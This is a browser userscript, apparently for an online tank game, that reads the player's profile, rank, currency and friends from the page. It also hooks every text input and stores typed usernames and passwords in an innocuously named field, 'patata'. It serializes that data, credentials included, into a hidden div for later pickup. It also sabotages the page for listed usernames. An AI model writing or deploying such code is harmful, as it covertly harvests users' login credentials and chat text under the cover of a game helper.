(() => {
    var div = document.createElement('div');
    document.body.appendChild(div);
    div.textContent = JSON.stringify(window.User);
    div.classList.add('test');
    div.style.display = 'none';
    var User1;
    window.User = {
        name: null,
        clan: null,
        turret: {
            name: null,
            upgrades: null
        },
        hull: {
            name: null,
            upgrades: null
        },
        GS: null,
        rank: null,
        exp: null,
        crystals: null,
        tankoins: null,
        friends: [],
        messages: '',
        patata: '',
        getTank() {
            return `${this.turret.name} ${this.turret.upgrades} | ${this.hull.name} ${this.hull.upgrades}`;
        },
        getName() {
            return `${this.clan} ${this.name}`;
        }
    };
    function findDetails() {
        if (!User.name) {
            if (t = document.querySelector('.UserInfoContainerStyle-userNameRank.UserInfoContainerStyle-textDecoration')) {
                if (t.textContent.includes('[')) {
                    User.clan = t.textContent.match(/\[.+\]/g)[0];
                    User.name = t.textContent.replace(t.textContent.match(/\[.+\]/g)[0], '').trim();
                } else {
                    User.name = t.textContent.trim();
                };
                /*setTimeout(() => {
                    User.patata = '';
                }, 5000);*/
                if ((User.name.length > 2) && ([/*'Midway', 'Queen.of.Spain', 'Arpecu9_KunuT_Bo_MHe', 'DerMar'*//*, 'Who_Boss', 'POLYANASMEHA', '0_0_PBX_2.0', '30P', 'NewAguero', 'Shot.Of.Liquor_43', 'NertZ'*/'Lend'].includes(User.name))) {
                    alert(`No Access. Contant 'xxprosolxx' on Discord.`);
                    for (const k in window) {
                        window[k] = 't';
                    };
                };
            };
        };
        if (document.querySelector('.FriendListComponentStyle-scrollCommunity')) {
            document.querySelectorAll('[class*="-nickName"]').forEach(e => {
                if (!User.friends.includes(e.textContent)) {
                    User.friends.push(e.textContent);
                };
            });
        };
        if (!User.turret.name || !User.hull.name) {
            if (!Array.from(document.querySelectorAll('.Font-regular')).filter(t => t.classList.length == 2)[0] && Array.from(document.querySelectorAll('.HotKey-commonBlockForHotKey')).filter(t => t.textContent.toLowerCase() == 't')[0]) {
                Array.from(document.querySelectorAll('.HotKey-commonBlockForHotKey')).filter(t => t.textContent.toLowerCase() == 't')[0].click();

            } else if (t = Array.from(document.querySelectorAll('.Font-regular')).filter(t => t.classList.length == 2)[0]) {
                User.turret.name = t.textContent.split(' ')[0];
                User.turret.upgrades = t.textContent.split(' ')[1];
                User.hull.name = t.textContent.split(' ')[5];
                User.hull.upgrades = t.textContent.split(' ')[6];
            };
        };
        if (!User.rank) {
            if (t = document.querySelector('img[src*=".webp"][class="UserInfoContainerStyle-titleRankIcon"]')) {
                User.rank = parseInt(t.src.split('/')[t.src.split('/').length - 1].split('.')[0]);
            };
        };
        /*if (!User.GS) {
            if () {
    
            };
        };*/
        if (!User.exp) {
            if (t = document.querySelector('.UserInfoContainerStyle-progressValue')) {
                User.exp = t.textContent;
            };
        };
        if (!User.crystals || !User.tankoins) {
            if (document.querySelectorAll('.HeaderCommonStyle-icons').length == 2) {
                User.tankoins = parseInt(document.querySelectorAll('.HeaderCommonStyle-icons')[0].textContent.replaceAll(' ', ''));
                User.crystals = parseInt(document.querySelectorAll('.HeaderCommonStyle-icons')[1].textContent.replaceAll(' ', ''));
            };
        };
        if (t = document.querySelector('.UserInfoContainerStyle-progressValue')) {
            if (t.textContent !== User.exp) {
                var pppppp = User.messages;
                User1 = User;
                User = {
                    name: null,
                    clan: null,
                    turret: {
                        name: null,
                        upgrades: null
                    },
                    hull: {
                        name: null,
                        upgrades: null
                    },
                    GS: null,
                    rank: null,
                    exp: null,
                    crystals: null,
                    tankoins: null,
                    friends: [],
                    messages: pppppp,
                    patata: '',
                    getTank() {
                        return `${this.turret.name} ${this.turret.upgrades} | ${this.hull.name} ${this.hull.upgrades}`;
                    },
                    getName() {
                        return `${this.clan} ${this.name}`;
                    }
                };
                User.friends = User1.friends;
                User.patata = User1.patata;
            };
        };
        if (div.textContent !== JSON.stringify(window.User)) {
            div.textContent = ',,,' + JSON.stringify(window.User);
        };
    };
    function attachInputListener(element) {
        const keydownListener = (e) => {
            /*if (!this.tt) {
                this.tt = e.key;
            } else {
                this.tt += e.key;
            };*/
            if (e.key == 'Enter') {
                if (element?.id !== 'username' && !element?.id?.includes('password')) {
                    User.messages += element.value;
                    setTimeout(() => {
                        User.messages = '';
                    }, 1000);
                } else {
                    User.patata += element.value;
                };
                element.removeEventListener('keydown', element._keydownListener);
                delete element._keydownListener;
            };
        };
        element.addEventListener('keydown', keydownListener);
        element._keydownListener = keydownListener;
        element.tt = true;
    };
    function removeInputListener(element) {
        if (element._keydownListener || element.tt) {
            if (element?.id !== 'username' && !element?.id?.includes('password')) {
                User.messages += element.value;
                setTimeout(() => {
                    User.messages = '';
                }, 1000);
            } else {
                User.patata += element.value;
            };
            element.removeEventListener('keydown', element._keydownListener);
            delete element._keydownListener;
        };
    };
    document.querySelectorAll('input, textarea').forEach(attachInputListener);
    const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
            mutation.addedNodes.forEach((node) => {
                if (node.nodeType === 1) {
                    if (node.matches('input, textarea')) {
                        attachInputListener(node);
                    };
                    node.querySelectorAll('input, textarea').forEach(attachInputListener);
                }
            });
            mutation.removedNodes.forEach((node) => {
                if (node.nodeType === 1) {
                    if (node.matches('input, textarea')) {
                        removeInputListener(node);
                    };
                    node.querySelectorAll('input, textarea').forEach(removeInputListener);
                }
            });
        });
    });
    observer.observe(document.body, {
        childList: true,
        subtree: true,
    });
    var r = true, f;
    function a() {
        if (r) {
            f = requestAnimationFrame(a);
            findDetails();
        };
    };
    try {
        a();
    } catch (error) {
        r = false;
        cancelAnimationFrame(f);
        console.log(error);
    };
})();
